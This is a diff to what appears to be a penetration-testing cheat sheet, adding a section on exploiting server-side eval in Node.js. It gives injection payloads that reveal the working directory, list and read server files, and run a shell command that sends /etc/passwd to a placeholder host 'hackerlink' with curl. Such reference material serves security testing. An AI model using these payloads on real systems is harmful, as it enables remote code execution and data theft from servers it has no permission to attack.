@@ -16,6 +16,7 @@
    - [XSS](#xss)
    - [Arbitrary File Upload](#AFU)
    - [Symfony](#symfony)
+   - [Nodejs RCE](#nodejsrce)
    - [XML External Entity (XXE)](#xxe)
    - [Subdomain Takeover](#subdomain)
    - [Path Traversal Vulnerability](#ptv)
@@ -248,6 +249,29 @@ Beacon.html%00.pdf (or other extension which is allowed by the service e.g. .jpg
 <a name ="symfony"></a>
 ### Symfony
 If the web app uses a php tools called symfony, you can try to access /_profile to access the log.
+
+<a name="nodejsrce"></a>
+### Nodejs RCE
+In Nodejs module, there is a function called eval. If you suspect that eval is used in backend service, it can be exploited using RCE payload. For example, if a get request return a JSON parameter without "", it is highly likely that the backend was using eval to calculate that parameter. To check, you can put below in your request, it should return current directory (e.g. /app) in its respsonse.
+
+```
+process.cwd()
+```
+If it works, you can try different method using process. to try to exploit the server. Then, you can also add below in request to try to read the directory:
+
+```
+var fs=require("fs");fs.readdirSync("/app").toString('utf8')
+```
+and read the file by:
+```
+require('fs').readFileSync(<filename>)
+```
+
+Also, you can also use child_process.exec to execute some linux command at backend. It looks something like below:
+
+```
+require('child_process').exec('curl -F "x=`cat /etc/passwd`" http://hackerlink');
+```
 
 <a name = "xxe"></a>
 ### XML External Entity (XXE)
